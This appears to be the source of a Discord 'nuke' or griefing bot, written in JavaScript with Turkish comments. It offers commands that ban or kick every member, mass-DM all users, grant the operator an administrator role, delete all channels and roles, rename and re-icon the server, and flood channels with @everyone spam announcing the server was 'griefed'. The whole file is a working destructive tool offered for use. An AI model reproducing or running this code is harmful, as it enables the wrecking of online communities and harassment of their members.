const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {         
  if (msg.content === "+gban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+gkick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+gduyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**BU SUNUCU GRİEFED YEDİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+gyetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".griefedyetki",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+gkanal") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("griefed-dc", {
      type: "text"
    });
      await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
                         await msg.guild
      .createChannel("GRİEFED SERVER", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });      
                await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    
    await msg.guild.setIcon("https://hizliresim.com/81064F");  //SUNUCUNUN PPSİNİ DEĞİŞTİRİR.
    await msg.guild.setName(" GRİEFED SERVER "); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://hizliresim.com/81064F"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("ャ GRİEFED ャ");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**BİZ YENİLMEYİZ :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }  
});



    client.on("message", msg => {
  if (msg.content === "+grol") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });    
    msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "GRİEFED",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
                msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
            msg.channel.send('**__BU SUNUCU ARTIK GRİEFED YEDİ__** @everyone :wink: :heart:'); 
    
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


